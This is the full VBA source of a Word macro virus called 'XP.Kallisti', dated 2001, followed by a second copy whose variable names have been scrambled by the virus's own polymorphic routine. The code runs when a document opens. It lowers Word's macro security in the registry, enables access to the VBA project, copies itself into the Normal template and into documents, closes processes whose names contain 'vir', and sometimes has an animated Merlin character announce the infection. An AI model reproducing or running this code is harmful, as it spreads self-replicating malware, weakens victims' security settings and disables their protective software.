Private Sub Document_Open()
On Error Resume Next
jOne = jOne + 1
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") <> 1& Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
WordBasic.FileExit dlg
End If
If VBA.GetAttr(Word.Application.ActiveDocument.FullName) = jOne Then
VBA.SetAttr Word.Application.ActiveDocument.FullName, (Rnd * 0)
ActiveDocument.Reload
End If
VBA.SetAttr Word.Application.NormalTemplate.FullName, (Rnd * 0)
Options.SaveNormalPrompt = vbEmpty
Set host = VBA.IIf(Word.Application.MacroContainer = Word.Application.ActiveDocument, Word.Application.NormalTemplate, Word.Application.ActiveDocument)
With host.VBProject
With .vbcomponents.Item(jOne).Codemodule
If Not .lines(90, jOne) Like "'XP*" Then
.deletelines jOne, .countoflines
.insertlines jOne, jsmp(Word.MacroContainer.VBProject.vbcomponents.Item(jOne).Codemodule.lines(jOne, 92))
If host = Word.Application.ActiveDocument Then Word.Application.ActiveDocument.SaveAs Word.Application.ActiveDocument.FullName, wdFormatDocument
End If
End With
End With
For yXP = jOne To Word.Tasks.Count
If VBA.InStr(jOne, VBA.LCase(Word.Tasks(yXP).Name), "vir") Then Word.Tasks(yXP).Close
Next
If VBA.InStr(jOne, VBA.Time, "5") Then
xMerlin = "Merlin"
Set objChar = CreateObject("Agent.Control.1")
objChar.Connected = True
If VBA.IsObject(objChar) Then
objChar.Characters.Load xMerlin, xMerlin & ".acs"
Set objMer = objChar.Characters(xMerlin)
With objMer
.Top = 100
.Left = 100
.LanguageID = &H409
.Show
End With
objMer.Play "Greet"
objMer.Speak "Hello, " & Word.Application.UserName & "!" & "\Vol=99"
objMer.Play "GetAttention"
objMer.Play "GetAttentionReturn"
objMer.Speak "I said: 'Hello " & Word.Application.UserName & "!" & Chr(39)
objMer.Play "Idle2_2"
objMer.Speak "Let me tell you something about a confused girl..."
objMer.Play "Idle1_1"
objMer.Speak "...once she turned around and thought,"
objMer.Play "Idle1_2"
objMer.Speak "how damn simple it is,"
objMer.Play "Idle1_1"
objMer.Speak "leaving a man she once loved,"
objMer.Play "Idle2_1"
objMer.Speak "but she did not notice,"
objMer.Play "Idle1_1"
objMer.Speak "that her heart had become deaf by the pain..."
objMer.Play "Acknowledge"
objMer.Play "Idle1_1"
objMer.Speak "Oh, I forgot..."
objMer.Play "Idle2_1"
objMer.Speak "I think you are infected with XP.Kallisti...(the first virus for Office XP ever)"
objMer.Play "Idle1_1"
objMer.Speak "Damn...I have to go now..."
objMer.MoveTo 800, 600
objMer.Play "Idle3_1"
objMer.Play "Wave"
objMer.Speak "Goodbye now " & Word.Application.UserName & "!"
Set finish = objMer.Hide
Do Until finish.Status = 0
VBA.DoEvents
Loop
objChar.Characters.Unload xMerlin
End If
End If
End Sub
Private Function jsmp(joc) 'Oh my god, it's poly...xD
jOne = jOne + 1
jav = "jsmp joc jav jvl jnv jvp jcv jOne host xMerlin yXP objChar objMer finish "
Do
jcv = VBA.Left(jav, VBA.InStr(jav, VBA.Chr(32)) - jOne): jav = VBA.Mid(jav, VBA.InStr(jav, VBA.Chr(32)) + jOne)
jnv = VBA.Chr((VBA.Int(VBA.Rnd * 75) + 129)) & VBA.Chr((VBA.Int(VBA.Rnd * 75) + 129)) & VBA.Chr((VBA.Int(VBA.Rnd * 75) + 129)) & VBA.Chr((VBA.Int(VBA.Rnd * 75) + 129)) & VBA.Chr((VBA.Int(VBA.Rnd * 75) + 129))
Do
jvp = VBA.InStr(jvp + jOne, VBA.LCase(joc), VBA.LCase(jcv))
If jvp Then joc = VBA.Mid(joc, jOne, (jvp - jOne)) & jnv & VBA.Mid(joc, (jvp + VBA.Len(jcv)))
Loop While jvp
Loop While jav <> ""
jsmp = joc
End Function
'XP.Kallisti
'(c) 2001 jackie // linezer0



-----[snip]------


Private Sub Document_Open()
On Error Resume Next
µ ì©à = µ ì©à + 1
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") <> 1& Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
WordBasic.FileExit dlg
End If
If VBA.GetAttr(Word.Application.ActiveDocument.FullName) = µ ì©à Then
VBA.SetAttr Word.Application.ActiveDocument.FullName, (Rnd * 0)
ActiveDocument.Reload
End If
VBA.SetAttr Word.Application.NormalTemplate.FullName, (Rnd * 0)
Options.SaveNormalPrompt = vbEmpty
Set À≥Ç¨à = VBA.IIf(Word.Application.MacroContainer = Word.Application.ActiveDocument, Word.Application.NormalTemplate, Word.Application.ActiveDocument)
With À≥Ç¨à.VBProject
With .vbcomponents.Item(µ ì©à).Codemodule
If Not .lines(90, µ ì©à) Like "'XP*" Then
.deletelines µ ì©à, .countoflines
.insertlines µ ì©à, ©¨ñóª(Word.MacroContainer.VBProject.vbcomponents.Item(µ ì©à).Codemodule.lines(µ ì©à, 92))
If À≥Ç¨à = Word.Application.ActiveDocument Then Word.Application.ActiveDocument.SaveAs Word.Application.ActiveDocument.FullName, wdFormatDocument
End If
End With
End With
For ùó» ü = µ ì©à To Word.Tasks.Count
If VBA.InStr(µ ì©à, VBA.LCase(Word.Tasks(ùó» ü).Name), "vir") Then Word.Tasks(ùó» ü).Close
Next
If VBA.InStr(µ ì©à, VBA.Time, "5") Then
àºñÑó = "Merlin"
Set ïçç±ü = CreateObject("Agent.Control.1")
ïçç±ü.Connected = True
If VBA.IsObject(ïçç±ü) Then
ïçç±ü.Characters.Load àºñÑó, àºñÑó & ".acs"
Set ü∂ô∞ê = ïçç±ü.Characters(àºñÑó)
With ü∂ô∞ê
.Top = 100
.Left = 100
.LanguageID = &H409
.Show
End With
ü∂ô∞ê.Play "Greet"
ü∂ô∞ê.Speak "Hello, " & Word.Application.UserName & "!" & "\Vol=99"
ü∂ô∞ê.Play "GetAttention"
ü∂ô∞ê.Play "GetAttentionReturn"
ü∂ô∞ê.Speak "I said: 'Hello " & Word.Application.UserName & "!" & Chr(39)
ü∂ô∞ê.Play "Idle2_2"
ü∂ô∞ê.Speak "Let me tell you something about a confused girl..."
ü∂ô∞ê.Play "Idle1_1"
ü∂ô∞ê.Speak "...once she turned around and thought,"
ü∂ô∞ê.Play "Idle1_2"
ü∂ô∞ê.Speak "how damn simple it is,"
ü∂ô∞ê.Play "Idle1_1"
ü∂ô∞ê.Speak "leaving a man she once loved,"
ü∂ô∞ê.Play "Idle2_1"
ü∂ô∞ê.Speak "but she did not notice,"
ü∂ô∞ê.Play "Idle1_1"
ü∂ô∞ê.Speak "that her heart had become deaf by the pain..."
ü∂ô∞ê.Play "Acknowledge"
ü∂ô∞ê.Play "Idle1_1"
ü∂ô∞ê.Speak "Oh, I forgot..."
ü∂ô∞ê.Play "Idle2_1"
ü∂ô∞ê.Speak "I think you are infected with XP.Kallisti...(the first virus for Office XP ever)"
ü∂ô∞ê.Play "Idle1_1"
ü∂ô∞ê.Speak "Damn...I have to go now..."
ü∂ô∞ê.MoveTo 800, 600
ü∂ô∞ê.Play "Idle3_1"
ü∂ô∞ê.Play "Wave"
ü∂ô∞ê.Speak "Goodbye now " & Word.Application.UserName & "!"
Set é¨á£ƒ = ü∂ô∞ê.Hide
Do Until é¨á£ƒ.Status = 0
VBA.DoEvents
Loop
ïçç±ü.Characters.Unload àºñÑó
End If
End If
End Sub
Private Function ©¨ñóª(Ç∫æ∂Ñ) 'Oh my god, it's poly...xD
µ ì©à = µ ì©à + 1
†¡ºù… = "©¨ñóª Ç∫æ∂Ñ †¡ºù… ¬Ö»ú® ∫Ö≠§ó Ø±îïø æ≠ ≈í µ ì©à À≥Ç¨à àºñÑó ùó» ü ïçç±ü ü∂ô∞ê é¨á£ƒ "
Do
æ≠ ≈í = VBA.Left(†¡ºù…, VBA.InStr(†¡ºù…, VBA.Chr(32)) - µ ì©à): †¡ºù… = VBA.Mid(†¡ºù…, VBA.InStr(†¡ºù…, VBA.Chr(32)) + µ ì©à)
∫Ö≠§ó = VBA.Chr((VBA.Int(VBA.Rnd * 75) + 129)) & VBA.Chr((VBA.Int(VBA.Rnd * 75) + 129)) & VBA.Chr((VBA.Int(VBA.Rnd * 75) + 129)) & VBA.Chr((VBA.Int(VBA.Rnd * 75) + 129)) & VBA.Chr((VBA.Int(VBA.Rnd * 75) + 129))
Do
Ø±îïø = VBA.InStr(Ø±îïø + µ ì©à, VBA.LCase(Ç∫æ∂Ñ), VBA.LCase(æ≠ ≈í))
If Ø±îïø Then Ç∫æ∂Ñ = VBA.Mid(Ç∫æ∂Ñ, µ ì©à, (Ø±îïø - µ ì©à)) & ∫Ö≠§ó & VBA.Mid(Ç∫æ∂Ñ, (Ø±îïø + VBA.Len(æ≠ ≈í)))
Loop While Ø±îïø
Loop While †¡ºù… <> ""
©¨ñóª = Ç∫æ∂Ñ
End Function
'XP.Kallisti
'(c) 2001 jackie // linezer0
